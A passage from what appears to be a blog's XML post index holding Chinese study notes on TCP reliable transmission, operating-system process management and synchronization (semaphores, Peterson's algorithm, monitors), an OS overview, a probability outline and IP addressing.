理想的传输条件有以下两个特点:传输信道不产生差错,不管发送方以多快的速度发送数据,接收方总是来得及处理收到的数据.在这样的理想传输条件下,不需要采取任何措施就能够实现可靠传输.IP网络所提供的是不可靠的传输,TCP需要自己来提供可靠交付的服务. 停止等待协议 停止等待就是每发送完一个分组就停止发送,等待对方的确认.在收到确认后再发送下一个分组.全双工通信的双方既是发送方也是接收方. 无差错情况. 出现差错有两种情况:接收方接收分组时检测出了差错,就丢弃分组,其他什么也不做(不通知发送方收到有差错的分组);分组在传输过程中丢失了,接收方什么都不知道,也什么都不做.这两种情况下发送方都必须重发分组,直到接收方正确接收返回确认为止. 超时重传:发送方为每一个已发送的分组都设置一个超时计时器,只要在超时计时器到期之前收到了相应的确认,就撤销该超时计时器,继续发送下一个分组.若在超时计时器规定时间内没有收到确认,就认为分组错误或丢失,就重发该分组. 编号:发送方为每一个发送的分组都进行编号,若接收方收到了编号相同的分组,则认为收到了重复分组,丢弃重复的分组,并回送确认.接收方为发送的确认也进行编号,指示该确认是对哪一个分组的确认,发送方同样丢弃重复的确认. 确认丢失:若接收方所发送的对分组的确认丢失了,那么发送方在设定的超时重传时间内不能收到确认,无论是因为确认丢失还是分组错误还是分组丢失,都会重传分组.接收方丢弃重传的分组,并向发送方发送的对分组的确认. 确认迟到:若接收方所发送的对分组的确认迟到了,发送方仍重传分组.之后接收方丢弃重传的分组,并向发送方发送的对分组的确认.发送方丢弃重复的确认. 发送完一个分组后,必须暂时保留已发送的分组的副本以备重发.分组和确认分组都必须进行编号.超时计时器的重传时间应当比数据在分组传输的平均往返时间更长一些. 连续ARQ协议 通常发送方最终总是可以收到对所有发出的分组的确认,如果发送方不断重传分组但总是收不到确认,就说明通信线路太差,不能进行通信.使用上述的确认和重传机制,就可以在不可靠的传输网络上实现可靠的通信.这种传输协议常称为自动重传请求ARQ,意思是重传的请求是自动进行的,接收方不需要请求发送方重传某个出错的分组. 停止等待协议的优点是简单,缺点是信道利用率太低.当往返时间远大于分组发送时间时,信道的利用率就会非常低. 为了提高传输效率,发送方可以不使用低效率的停止等待协议,而是采用流水线传输.流水线传输就是发送方可连续发送多个分组,不必每发完一个分组就停顿下来等待对方的确认. 连续ARQ协议基本思想:发送方一次可以发出多个分组;使用滑动窗口协议控制发送方和接收方所能发送和接收的分组的数量和编号;每收到一个确认,发送方就把发送窗口向前滑动;接收方一般采用累积确认的方式;采用回退N方法进行重传. 累积确认:不必对收到的分组逐个发送确认,而是对按序到达的最后一个分组发送确认,表示到这个分组为止的所有分组都已正确收到了. 回退N:发送方发送了前5个分组,而中间的第3个分组丢失,这时接收方只能对前两个分组发出确认.发送方无法知道后面三个分组的下落,而只好把后面的三个分组都再重传一次.通信线路质量不好时,连续ARQ协议会带来负面的影响. TCP的可靠传输机制用字节的序号进行控制,TCP所有的确认都是基于序号而不是基于报文段.TCP连接的每一端都必须设有两个窗口:发送窗口和接收窗口.TCP两端的四个窗口经常处于动态变化之中.TCP连接的往返时间RTT也不是固定不变的,需要使用特定的算法估算较为合理的重传时间. 发送方维持的发送窗口,它的意义是:位于发送窗口内的分组都可连续发送出去,而不需要等待对方的确认.连续ARQ协议规定,发送方每收到一个确认,就把发送窗口向前滑动一个分组的位置. 发送后,在收到确认前,发送窗口会变小;接收的分组正确,向前滑动接收窗口;收到确认后,向前滑动发送窗口,窗口变大. TCP报文段的首部格式 P98 TCP可靠通信的实现 TCP的流量控制 TCP的拥塞控制 TCP的运输连接管理]]></content>
      <categories>
        <category>CS</category>
        <category>BASIC</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[CS-BASIC-operating-system-进程管理]]></title>
    <url>%2Fposts%2Ff3fda52a%2F</url>
    <content type="text"><![CDATA[概念 进程是程序的运行的实体,是操作系统进行资源分配和调度的一个独立单位.处理机(CPU)是最重要的系统资源,处理机管理的主要内容是处理机调度,而处理机分配和运行又是以进程为基本单位,故对处理机的管理可归结为对进程的管理. 从进程的角度:进程在封闭的环境顺序执行代码,独占全机资源,且每次进程的运行结果都是相同的. 从操作系统的角度:多个进程并发运行,间断的执行各进程,多个进程共享系统中的各种资源,每次进程的运行结果可能不再相同(这个有时候是需要的,比如用户输入,有时候是不需要的,比如条件竞争问题). 条件竞争问题主要源于对相同资源的写操作,如果一个进程写资源A,则写前和写后就出现了两种环境,另一个进程如果要访问该资源就会有两种不同的结果,重点在于此时的结果不可预测. 进程管理的基础 进程控制块PCB 系统利用进程控制块PCB来控制和管理进程,进程控制块PCB存放用于描述该进程情况和控制进程运行所需的全部信息.进程与PCB是一一对应的. 在进程控制块中,主要包括下述四方面用于描述和控制进程运行的信息. 进程标识符信息,用于唯一地标识一个进程,一个进程通常有两种标识符:外部标识符,由创建者提供;内部标识符,操作系统提供. 处理机状态信息,主要由处理机中各种寄存器的内容所组成,包括:通用寄存器,指令计数器,程序状态字,用户栈指针等. 进程调度信息,与进程调度和进程对换有关的信息,包括:进程状态,进程优先级,进程调度所需的其它信息,事件等. 进程控制信息,包括:程序和数据的地址(用于恢复运行),进程同步和通信机制(如消息队列指针,信号量等.它们可能全部或部分地放在PCB中),资源清单(除CPU外进程所需的全部资源及已经分配到该进程的资源清单),链接指针(本进程所在队列中的下一个进程的PCB首地址). PCB的组织方式:链接方式,不同状态进程分别组成队列;索引方式,根据所有进程的状态,建立几张索引表. 进程的特征与状态 进程具有五个基本特征. 动态性,进程是程序的一次执行过程,有一定的生命周期. 并发性:多个进程同时存于内存中,能在一段时间内同时运行. 独立性:独立运行,同时也是系统中独立获得资源和独立调度的基本单位. 异步性:进程按各自独立的,不可预知的速度向前推进,即按异步方式运行. 结构特征:进程实体是由程序段,数据段及进程控制块三部分组成,Unix中把这三部分统称为进程映像. 进程的三种基本状态. 就绪状态:指当进程已分配到除CPU以外的所有必要的资源后,只要能再获得处理机,便可立即执行. 执行状态:指进程已获得处理机,程序正在执行.在单处理机系统中,只能有一个进程处于执行状态.在多处理机系统中,则可能有多个. 阻塞状态:指进程因等待某事件暂停执行时的状态. 在不少系统中,又增加了两种基本状态. 新状态:指进程刚刚建立,但还未进入就绪队列时的状态. 终止状态:当一个进程已经正常结束或异常结束,OS已将它从就绪队列中移出,但尚未将它撤消时的状态. 有些系统定义一个挂起状态,引起挂起状态可能基于4个方面:终端用户的需要,父进程的需要,工作负荷调节的需要,操作系统的需要. Linux进程状态 Linux进程状态共6种. 执行(TASK_RUNNING):正在运行或准备运行的进程,实际参与进程调度. 可打断睡眠(TASK_INTERRUPTIBLE):处于等待队列中的进程,待资源有效时唤醒,也可由其它进程通过信号(signal)或定时中断唤醒后进入就绪队列. 不可打断睡眠(TASK_UNINTERRUPTIBLE):处于等待队列中的进程,待资源有效时唤醒,不可由其它进程通过信号(signal)或定时中断唤醒. 僵死(TASK_ZOMBIE):表示进程结束但尚未消亡的一种状态.此时,进程已经结束运行且释放大部分资源,但尚未释放PCB. 暂停(TASK_STOPPED):进程被暂停,通过其它进程的信号才能唤醒.导致这种状态的原因有二:收到SIGSTOP,SIGSTP,SIGTTIN或SIGTTOU信号;受其它进程的ptrace系统调用的控制而暂时将CPU交给控制进程. 交换(TASK_SWAPPING):进程页面被交换出内存的进程.2.0.35版本的Linux内核没有使用该状态. 此外,Linux还定义11种进程标志. 1234567891011PF_ALIGNWARN #打印对齐警告信息PF_PTRACED #被ptrace系统调用监控PF_TRACESYS #正在跟踪PF_FORKNOEXEC #进程刚创建,但还没执行PF_SUPERPRIV #超级用户特权PF_DUMPCORE #dumped corePF_SIGNALED #进程被信号杀出PF_STARTING #进程正被创建PF_EXITING #进程开始关闭PF_USEDFPU #该进程使用FPUPF_DTRACE #delayed trace 进程控制 进程控制是对系统中所有进程从产生,存在到消亡的全过程实行有效的管理和控制.通常将一些与硬件紧密相关的模块,运行频率较高的模块,以及一些基本操作都安排在紧靠硬件的软件层次中,并使它们常驻内存,加以特殊的保护,把这一部分称为OS的内核.进程控制一般是由操作系统的内核来实现. 内核中通常都包含以下功能(Unix中,内核所包含的功能很多,OS的整个基本功能都属于内核):中断处理,时钟管理,原语操作,资源管理功能(进程管理,存储管理,设备管理).内核在执行某些基本操作时,往往是利用原语操作实现的.原语本身也是由若干条指令所构成,用于完成一定功能的一个过程.区别在于原语是原子操作,指一个操作中的所有动作,要么全做,要么全不做(通过关闭中断实现). 进程图是一棵有向树,结点代表进程.一棵树表示一个家族,根结点为该家族的祖先.也就是父进程与子进程的关系图. 创建进程 引起创建进程的事件:应用请求,用户登录,作业调度,提供服务. 创建进程的主要工作:向系统申请一个空闲的PCB,分配资源,初始化PCB,把PCB插入就绪队列. 进程终止 引起进程终止的事件:正常结束,异常结束(越界错误,保护错,特权指令错,非法指令错,运行超时,等待超时,算术运算错,I/O故障),外界干预(操作系统或用户,父进程请求,父进程终止). 终止过程的主要工作:根据被终止进程的标识符,从PCB集合中检索出该进程的PCB,从中读出该进程的状态.若被终止进程正处于执行状态,立即终止该进程的执行.若该进程还有子孙进程,还应将其所有子孙进程予以终止,以防成为不可控的进程.将被终止进程所拥有的全部资源,或者归还给其父进程,或者归还给系统.将被终止进程的PCB从所在队列(或链表)中移出,等待其他程序来搜集信息. 进程阻塞 引起进程阻塞的事件:请求系统服务不满足,启动某种操作,新数据尚未到达,无新工作可做 进程阻塞过程:立即停止执行,把进程控制块中的状态由执行改为阻塞.将PCB插入阻塞队列,如果系统中设置了因不同事件而阻塞的多个阻塞队列,则应将本进程插入到具有相同事件的阻塞(等待)队列.调度程序进行重新调度,将处理机分配给另一就绪进程并进行切换. 进程唤醒 引起进程唤醒事件:系统服务由不满足到满足,I/O(启动的操作)完成,新数据到达. 进程唤醒过程:被阻塞的进程从等待该事件的阻塞队列中移出,将其PCB中的状态由阻塞改为就绪,然后再将该PCB插入到就绪队列中. 挂起与激活 挂起原语的执行过程:检查被挂起进程的状态,若处于活动就绪状态,便将其改为静止就绪;对于活动阻塞状态的进程,将之改为静止阻塞.为了方便用户或父进程考查该进程的运行情况而把该进程的PCB复制到某指定的内存区域.最后,若被挂起的进程正在执行,则转向调度程序重新调度. 激活原语的执行过程:先将进程从外存调入内存,检查该进程的现行状态,若是静止就绪,便将之改为活动就绪;若为静止阻塞便将之改为活动阻塞.假如采用的是抢占调度策略,则每当有新进程进入就绪队列时,应检查是否要进行重新调度. 进程同步 在多道程序系统中,由于资源共享或进程合作,使进程间形成间接相互制约和直接相互制约关系,这需要用进程互斥与同步机制来协调两种制约关系. 临界资源与临界区 系统中某些资源一次只允许一个进程使用,称这样的资源为临界资源或互斥资源.只要把进程中访问临界资源的那段代码分离出来(称为临界区),诸进程互斥地进入自己的临界区即可. 每个进程在进入临界区之前应先对欲访问的临界资源进行检查,临界资源未被访问才可进入临界区,并设置它正被访问的标志;否则不能进入临界区,必须等待,以保证诸进程互斥地访问临界资源.对要求访问临界资源的进程,应保证该进程能在有效时间内进入自己的临界区,当进程不能进入自己的临界区时,应立即释放处理机以免陷入死等状态. 相应地,在结束对临界区的访问后也要加上一段代码用于将临界区正被访问的标志恢复为未被访问标志. 利用软件解决进程互斥问题 假如有两个进程Pi和Pj,它们共享一个临界资源R.用软件方法使进程Pi和Pj能互斥地访问资源R. Peterson算法:flag[i]为true表示Pi要进或正在临界区.turn为j,表示应轮到Pj. 12345678910111213141516171819202122232425P0: repeat flag[0]:=true; turn:=1; while (flag[1] and turn=1) do no_op; critical_section; flag[0]:=false; remainder_section;until false;P1: repeat flag[1]:=true; turn:=0; while (flag[0] and turn=0) do no_op; critical_section; flag[1]:=false; remainder_section;until false;flag[0]=false;flag[1]=false;Parbegin(P0, P1); 利用硬件解决进程互斥问题 由于中断的原因,使得一个进程在对一个共享资源的取值和修改的这两个动作中,可能有其他进程对此共享资源的修改,从而破坏了此共享变量数据的完整性和正确性,导致非预期的结果. 许多大型机和微型机中都提供了专用的硬件指令(例如IBM370系列机中的TS(检测和设置)指令,Intel 8086中的XCHG),这些指令允许将多个操作限制为一个原子操作,中间不会发生中断,用这些指令就可以解决临界区问题. 原子操作,对于单处理机,可用禁止中断实现,对于多处理机,要用软件协助解决. 锁方法 为了解决同类临界区互斥问题,可以为每类临界区设置一把锁,锁有两种状态:打开状态,资源空闲,可以进入临界区;关闭状态,资源被占用,不可进入临界区.只要在每个进程进入临界区前,执行关锁操作阻止别的进程进入临界区,退出临界区后执行开锁操作让别的进程进入临界区. TS功能C++语言描述. 12345678bool TS(bool &amp; lock) &#123; if(lock == true) return true; else &#123; lock = true; return false; &#125;&#125; 利用TS实现进程互斥:可为每个临界资源设置一个布尔变量lock,并赋予其初值为false,以表示资源空闲. 123456repeat while (TS(lock)) do skip critical_section; lock:=false; remainder_section; 锁方法缺点:忙等,某种临界资源只能一个进程使用. 信号量机制 在长期且广泛的应用中,信号量机制得到了很大的发展,从整型信号量到记录型信号量,进而发展为信号量集机制.P.V分别是荷兰语的test(proberen,测试)和increment(verhogen,增量). 整型信号量 最初把信号量定义为一个整型量,用于表示资源的使用情况,除初始化外,仅能通过两个标准的原子操作wait(s)和signal(s)来访问,分别称为P,V操作. 1234567wait(s): while (s &lt;= 0) do no-op s:=s-1;signal(s): s:=s+1; s表示空闲资源数,P操作申请一个资源,V操作释放一个资源,P.V操作必须成对出现. 整型信号量缺点:忙等. 记录型信号量 为克服忙等,重新对信号量和P.V操作定义. 12345678910111213141516171819202122232425信号量数据结构type semaphore = record value:integer; 资源使用情况 L:list of process; 在此信号量上等待的进程队列指针endS.Value &gt; 0 表示某类可用资源的数量S.Value &lt; 0 其绝对值为因请求该资源而被阻塞的进程数S.Value的初值为1表示只允许一个进程访问临界资源,此时的信号量转化为互斥信号量.procedure wait(s): 意味着请求分配一个单位资源 var S:semaphore; begin S.value:=S.value – 1; If (S.value &lt; 0) then block(S,L); 无空闲资源,进程被阻塞,不会忙等 endprocedure signal(s): 意味着释放一个单位资源 var S:semaphore; begin S.value:=S.value + 1; If (S.value &lt;= 0) then wakeup(S,L); 唤醒第一个,插入就绪队列 end 死锁 当一个进程需要先获得两个或更多的共享资源后,方能执行时,进程并发执行可能产生死锁. 假定有两个进程A和B,都要访问共享数据D和E,可为其设互斥信号量Dmutex和Emutex,令初值为1. 123456789101112process A wait(Dmutex); wait(Emutex);process B wait(Emutex); wait(Dmutex); procedure A: wait(Dmutex);于是Dmutex = 0procedure B: wait(Emutex);于是Emutex = 0procedure A: wait(Emutex);于是Emutex = -1,A阻塞procedure B: wait(Dmutex);于是Dmutex = -1,B阻塞 AND型信号量集机制解决进程死锁问题 将进程在整个运行过程中所需要的所有临界资源,一次性地全部分配给进程,待该进程使用完后在一起释放. 为此在wait操作中增加了一个AND条件,故称为AND同步,或称为同时wait操作,即Swait(Simulianeouswait).signal操作同样做出改变. 123456789101112131415Swait(S1, S2, ..., Sn) if S1 &gt;= 1 AND S2 &gt;= 1 AND ... AND Sn &gt;= 1 then for I := 1 to n do Si:= Si – 1; endfor else 调用进程进入第一个小于1信号量的等待队列Sj.queue,阻塞调用进程 endifSsignal(S1,S2,S3,…,Sn) For i:= 1 to n do Si:= Si + 1; 将Si.queue中等待的每一个进程取出 判断进程P是否通过Swait中的测试,是则进程P进入就绪队列,否则进程P进入某等待队列. endfor 信号量集 对AND信号量机制进行两方面扩充,一次分配释放多个临界资源对系统现有资源数的测试值由1改为ti. 1234567891011121314Swait(S1,t1,d1,S2,t2,d2,…,Sn,tn,dn) if S1 &gt;= t1 AND S2 &gt;= t2 ... Sn &gt;= tn then for I := 1 to n do Si:= Si - di; endfor else 调用进程进入第一个小于ti信号量的等待队列Si.queue,阻塞调用进程 endifSsignal(S1,t1,d1,S2,t2,d2,…,Sn,tn,dn) For i:= 1 to n do Si:= Si + di; 将Si.queue中等待的每一个进程取出 endfor 信号量的应用 在并发系统中,信号量被广泛地用于:使诸进程互斥地进入临界区;处理程序或语句间的前趋关系. 12345678910111213141516171819202122var mutex:semaphore:＝1;begin parbegin process 1:begin repeat wait(mutex); critical_section; signal(mutex); remainder_section; until false; end process 2:begin repeat wait(mutex); critical_section; signal(mutex); remainder_section; until false; end parendend 123456var S:semaphore:＝0;S1 V(S) 前趋语句后做V(S)操作P(S) 后继语句前后做P(S)操作S2 经典进程同步问题 管程机制 虽然信号量机制是一种既方便又有效的进程同步机制,但每个要访问临界资源的进程必须自备同步操作wait(s)和signal(s),必须成对出现,也不能颠倒.这就使大量的同步操作分散在各个进程中,这不仅给系统的管理带来麻烦,而且还会因同步操作的使用不当而导致系统死锁.这样,在解决上述问题的过程中,便产生了一种新的进程同步工具,管程. 管程由三部分组成:局部于管程的共享变量说明,对该数据结构进行操作的一组过程,对局部于管程的数据设置初始值的语句. 1234567891011121314type monitor-name=monitor;Var x, y:condition;procedure entry P1(...); begin ... end;procedure entry P2(...); begin ... end;...procedure entry Pn(...); begin ... end;begin initialization code;end 管程中每个条件变量的P,V操作可表示为X.wait和X.signal. X.signal操作的作用,是重新启动一个被阻塞的进程,但如果没有被阻塞的进程,则X.signal操作不产生任何后果,这与信号量机制中的signal操作不同. 如果有进程Q处于阻塞状态,当进程P执行了X.signal操作后,怎样决定由哪个进行执行,哪个等待,可采用两种方式:P等待,直至Q离开管程或等待另一条件;Q等待,直至P离开管程或等待另一条件.Hansan却采用了第一种处理方式. 利用管程方法来解决生产者-消费者问题 1234567891011121314151617181920212223242526272829303132333435363738394041type producer-consumer=monitor;Var in, out, count:integer;buffer:array[0, ..., n - 1] of item;notfull, notempty:condition;procedure entry put(item) begin if count &gt;= n then notfull.wait; buffer[in] ∶= nextp; in ∶= (in + 1) mod n; count ∶= count + 1; if notempty.queue then notempty.signal; endprocedure entry get(item) begin if count &lt;= 0 then notempty.wait; nextc ∶= buffer[out]; out ∶= (out + 1) mod n; count ∶= count - 1; if notfull.quene then notfull.signal; endbegin in∶=out∶=0; count∶=0endproducer:begin repeat produce an item in nextp; PC.put(item); until false;endconsumer:begin repeat PC.get(item); consume the item in nextc; until false;end 进程通信 高级进程通信,是指用户可直接利用操作系统所提供的一组通信命令,高效地传送大量数据的一种通信方式.操作系统隐藏了进程通信的实现细节.高级通信机制可归结为三大类:共享存储器系统,消息传递系统,管道通信. 共享存储器系统 通过共享某些数据结构或共享存储区进行通信. 基于共享数据结构的通信方式:进程通过公用某些数据结构交换信息.如在生产者—消费者问题中是用有界缓冲区这种数据结构实现通信的.这里,公用数据结构的设置及对进程间同步的处理,都是程序员的职责.因此这种通信方式是低效的只适于传递少量数据. 基于共享存储区的通信方式:为传输大量数据,在存储器中划出了一块共享存储区,诸进程可通过对共享存储区中的数据,进行读写来实现通信.进程在通信前,向系统申请共享存储区中的一个分区,并指定该分区的关键字;若这样的分区已分配结其它进程,则返回该分区的描述符.接着,申请者可把该分区连接到本进程上;此后,便可像读,写普通存储器一样地读,写公用存储分区. 消息传递系统 进程间的数据交换以消息为单位,程序员直接利用系统提供的一组通信命令来实现通信,操作系统隐藏了通信的实现细节. 消息传递系统因其实现方式的不同可分为:直接通信方式,发送进程直接将消息发送给接收进程,并将它挂在接收进程的消息缓冲队列上,接收进程从消息缓冲队列中取得消息;间接通信方式,发送进程将消息发送到某种中间实体中,接收进程从中取得消息.这种中间实体一般称为信箱,故这种通信方式也称为信箱通信方式,被广泛应用于计算机网络中,相应系统被称为电子邮件系统. 管道通信 所谓管道,是指用于连接一个读进程和一个写进程,以实现它们之间通信的共享文件,又称为pipe文件. 为了协调双方的通信,管道通信机制必须提供三方面的协调能力:当一个进程正在对pipe进行读／写操作时,另一进程必须等待;当写(输入)进程把一定数量(如4KB)数据写人pipe后,便去睡眠等待,直到读(输出)进程取走数据后,再把它唤醒,当读进程读一空白pipe时,也应睡眠等待,直至写进程将数据写入管道后,才将它唤醒;对方是否存在,只有确定对方已存在时,方能进行通信. 进程调度 进程调度的主要目的是分配处理机,但在不同的OS中所采用的调度方式是不完全相同的,因此可从不同的角度对调度进行分类.一种分类法也是较常用的,即按OS的类型分类,因而有批处理调度,分时调度和实时调度,还有多处理机调度.一种是常用的分类方法即按调度的层次,把调度分为高级,中级和低级调度. 作业从进入系统并驻留在外存的后备队列上开始,直至作业运行完毕,通常要经过三个状态,可能要经历三级调度:高级调度,中级调度,低级调度. 高级调度 高级调度又称为作业调度,接纳调度或长程调度,用于决定把外存上处于后备队列中哪些作业调入内存,并为它们创建进程,分配必要的资源,然后,再将新创建的进程排在就绪队列上,准备执行.在分时系统中为了能及时响应,用户通过键盘输入的命令或数据等,都是直接送入内存,因而无需配置作业调度.类似地,在实时系统中,通常也不需要作业调度. 作业调度每次要接纳多少个作业进入内存,取决于多道程序度,即允许有多少个作业同时在内存中运行.当内存中可以同时运行的作业太多时,可能会影响到系统的服务质量,如使周转时间太长.如果内存中同时运行的作业太少时,又会导致系统资源利用率和系统吞吐量太低. 应将哪些作业从外存调入内存,将取决于所采用的调度算法.最简单的是先来先服务调度算法,它是将最早进入外存的作业先调入内存;较常用的一种是短作业优先调度算法,即将外存上最短的作业最先调入内存;此外,还有基于作业优先权的调度算法,响应比高者优先的调度算法等; 低级调度 低级调度通常又称为进程调度,短程调度.它决定就绪队列中的哪个进程将获得处理机,然后由分派程序执行把处理机分配给该进程的操作. 进程调度的运行频率很高,在分时系统中通常是几十毫秒就要运行一次,进程调度是最基本的一种调度,在三种类型的OS中都必须配置这级调度.进程调度可采用非抢占方式和抢占方式. 非抢占方式:一旦把处理机分配给某进程后,便让该进程一直执行,直至该进程完成或发生某事件而被阻塞时,才再把处理机分配给其它进程,决不允许某进程抢占已经分配出去的处理机. 抢占方式:这种调度方式,允许调度程序根据某种原则,去停止某个正在执行的进程,将已分配给该进程的处理机,重新分配给另一进程. 时间片原则:各进程按时间片运行,当一个时间片用完后,便停止该进程的执行而重新进行调度.这种原则适用于分时系统,大多数实时系统,以及要求较高的批处理系统. 优先权原则:通常是对一些重要的和紧急的作业赋予较高的优先权,当这种作业到达时,如果其优先权比正在执行进程的优先权高便停止正在执行的进程,将处理机分配给优先权高的进程,使之执行. 短作业(进程)优先原则:当新到达的作业(进程)比正在执行的作业(进程)明显地短时,将剥夺长作业(进程)的执行,将处理机分配给短作业(进程),使之优先执行. 中级调度 中级调度又称为中程调度.引入中级调度的主要目的是为了提高内存的利用率和系统吞吐量.为此,应使那些暂时不能运行的进程不再占用宝贵的内存空间,而将它们调至外存上去等待,称此时的进程状态为就绪驻外存状态或挂起状态. 当这些进程重又具备运行条件且内存又稍有空闲时,由中级调度决定,将外存上的那些重又具备运行条件的就绪进程重新调入内存,并修改其状态为就绪状态,挂在就绪队列上,等待进程调度.]]></content>
      <categories>
        <category>CS</category>
        <category>BASIC</category>
      </categories>
      <tags>
        <tag>operating-system</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-BASIC-operating-system-概论]]></title>
    <url>%2Fposts%2F5a26f101%2F</url>
    <content type="text"><![CDATA[简介 操作系统是管理计算机硬件资源与软件运行的一个软件,需要处理如管理与配置内存,决定系统资源供需的优先次序,控制输入与输出设备,控制网络设备与管理文件系统等基本事务.个人操作系统一般会提供一个让用户与系统交互的操作界面.裸机是指未配置软件的计算机,必须用机器语言编程. OS的发展过程 主要有4个阶段. 无OS,手工操作阶段.此时CPU等待人工操作. 单道批处理系统.程序和数据的输入输出都是在外围计算机的控制下完成的,称之为脱机输入输出操作.此时CPU直接从外围计算机获取程序和数据,减少了CPU的空闲时间且提高I/O速度.批处理是指计算机系统对一批作业自动进行处理的一种技术. 多道批处理系统,分时系统和实时系统. 应用于微机的OS,如MS DOS,Windows,Unix和Linux;并行机(多处理机)OS,网络OS,分布式OS. 多道批处理系统:在计算机内存中同时存放若干道已开始运行尚未结束的程序,用户所提交的作业组成一个后备队列,作业调度程序按一定的算法从后备队列中选择若干个作业调入内存,使它们共享CPU和系统中的各种资源.优点:资源利用率高,系统吞吐量大,可提高内存和I/O设备利用率.缺点:平均周转时间长,无交互能力.需要解决的问题:处理机管理,内存管理,I/O设备管理,文件管理,作业(进程)管理. 分时系统:采用时间片(时间片太小会增加系统开销)的方法,同时为许多终端用户服务,对每个用户能保证足够快的响应时间,并提供交互会话的功能.特点,多路性,交互性,独占性,及时性. 实时系统:能及时响应外部事件的请求,在规定的时间内完成对该事件的处理,并控制所有实时任务协调一致地运行.分为实时控制系统(工业生产)和实时信息处理系统(银行,机票订购系统).特点,对外部请求在严格时间范围内作出反应,高可靠性,安全性和完整性. OS的基本特性 OS的四个基本特性. 并发:并发指一段时间间隔内运行;并行指同一时刻运行. 共享:互斥共享和同时访问. 虚拟:把一个物理实体变为若干个逻辑上的对应物. 异步:在多道程序环境下,某个作业何时执行,何时暂停,执行时间是不确定的. OS的功能 从资源管理观点看,操作系统具有五大功能:处理机管理,存储器管理,设备管理,文件管理,用户接口. 处理机管理 对处理机的分配和运行实施有效管理,即对进程的管理. 进程控制:建立进程,分配资源,调度运行;撤消该进程,回收资源. 进程同步:指系统对并发执行的进程进行协调,最基本的进程同步方式是使诸进程以互斥方式访问临界资源. 进程通信:相互合作的进程间进行信息的交换. 进程调度:当一个正在执行的进程已经完成,或因某事件而无法继续执行时,系统应进行进程调度,重新分配处理机. 存储器管理 对内存的管理. 内存分配:各道程序都有自己的内存空间,涉及分配,回收,移动等. 内存保护:保证各道程序都只在自己的内存空间运行而互不干扰. 地址映射:把程序地址空间中的逻辑地址转换为内存空间对应的物理地址,从而为用户编程提供了方便. 内存扩充:借助于虚拟内存空间技术,使系统的内存比物理内存大得多. 设备管理 为用户程序分配I/O设备,完成用户程序请求的I/O操作,提高CPU和I/O设备的利用率. 缓冲管理:利用缓冲来缓和CPU和I/O设备间速度不匹配的矛盾. 设备分配:系统根据用户所请求的设备类型和所采用的分配算法对设备进行分配. 设备处理:启动指定的I/O设备,完成用户规定的I/O操作. 虚拟设备功能:通过某种技术使该设备成为能被多个用户共享的设备,以提高设备利用率. 文件管理 进行文件存储空间的管理,目录管理,文件读写管理.包括文件的属性,大小,存储位置等等. 用户接口 包括命令接口shell指令,程序接口,图形接口GUI界面.]]></content>
      <categories>
        <category>CS</category>
        <category>BASIC</category>
      </categories>
      <tags>
        <tag>operating-system</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Math-probability-theory-随机变量的数字特征]]></title>
    <url>%2Fposts%2F2f281f3%2F</url>
    <content type="text"><![CDATA[随机变量的数学期望 随机变量函数的数学期望 数学期望的性质 对于一个复杂的随机变量X,可以将X分解成数个r.v.之和,然后利用随机变量和的数学期望等于随机变量的数学期望之和来求解. 方差 方差描述了r.v.对其数学期望的离散程度,在概率论和数理统计中十分重要. 常用计算公式. 方差的性质 方差的性质. 常见分布的数学期望和方差 协方差和相关系数 协方差的性质 相关系数的性质 不相关与相互独立 矩,协方差矩阵 协方差阵的性质 n元正态随机变量及其性质 n元正态随机变量的性质.]]></content>
      <categories>
        <category>Math</category>
      </categories>
      <tags>
        <tag>probability-theory</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-BASIC-computer-network-网络层]]></title>
    <url>%2Fposts%2Fd6414950%2F</url>
    <content type="text"><![CDATA[网络层(网际层)提供的两种服务 虚电路服务:虚电路表示这只是一条逻辑上的连接,分组都沿着这条选定的逻辑连接按照存储转发方式传送,而并不是真正建立了一条物理连接.电路交换的电话通信是先建立了一条真正的物理连接. 数据报服务:网络层向上只提供简单灵活的,无连接的,尽最大努力交付的数据报服务,网络在发送分组时不需要先建立连接.每一个分组(即IP数据报)独立发送,与其前后的分组无关(不进行编号).网络层不提供服务质量的承诺,即所传送的分组可能出错,丢失,重复和失序(不按序到达终点),也不保证分组传送的时限. 网际协议IP 网际协议IP是TCP/IP体系中两个最主要的协议之一,与IP协议配套使用的还有三个协议:地址解析协议ARP,网际控制报文协议ICMP,网际组管理协议IGMP(这里讨论的IP都是指IPv4). 虚拟互连网络 将网络互相连接起来要使用一些中间设备,中间设备又称为中间系统或中继系统,有五种不同的中间设备:物理层中继系统-转发器,数据链路层中继系统-网桥或桥接器,网络层中继系统-路由器,网桥和路由器的混合物-桥路器,网络层以上的中继系统-网关.当中继系统是转发器或网桥时(网络层以下),一般并不称之为网络互连,因为这仅仅是把一个网络扩大了,而这仍然是一个网络. 网关由于比较复杂,目前使用得较少.网络互连都是指用路由器进行网络互连和路由选择.许多有关TCP/IP的文献将网络层使用的路由器称为网关. 虚拟互连网络就是逻辑互连网络,互连起来的各种物理网络的异构性本来是客观存在的,利用IP协议就可以使这些性能各异的网络在用户看起来好像是一个统一的网络,这种虚拟互连网络可简称为IP网. 使用虚拟互连网络的好处是:当互联网上的主机进行通信时,就好像在一个网络上通信一样,而看不见互连的各具体的网络异构细节.如果在这种覆盖全球的IP网的上层使用TCP协议,那么就是现在的互联网. 分类的IP地址 把整个互联网看成为一个单一的,抽象的网络,IP地址就是给每个连接在互联网上的主机(或路由器)分配一个在全世界范围是唯一的32位的标识符.IP地址现在由互联网名字和数字分配机构ICANN进行分配. IP地址是一种分等级的地址结构,IP地址的编址方法:分类的IP地址(最基本的编址方法),子网的划分(对最基本的编址方法的改进),无分类编址方法(构成超网). 分类的IP地址:将IP地址划分为若干个固定类,每一类地址都由两个固定长度的字段组成,一个字段是网络号net-id,它标志主机(或路由器)所连接到的网络;另一个字段是主机号host-id,它标志该主机(或路由器).通常IP使用点分十进制表示:192.168.235.131.路由器仅根据目的主机所连接的网络号来转发分组,减小了路由表所占的存储空间. 实际上IP地址是标志一个主机(或路由器)和一条链路的接口,当一个主机同时连接到两个网络上时,该主机就必须同时具有两个相应的IP地址,这种主机称为多归属主机.由于一个路由器至少应当连接到两个网络,因此一个路由器至少应当有两个不同的IP地址.两个路由器直接相连的接口处,可指明也可不指明IP地址.如指明IP地址,则这一段连线就构成了一种只包含一段线路的特殊网络.现在常不指明IP地址. 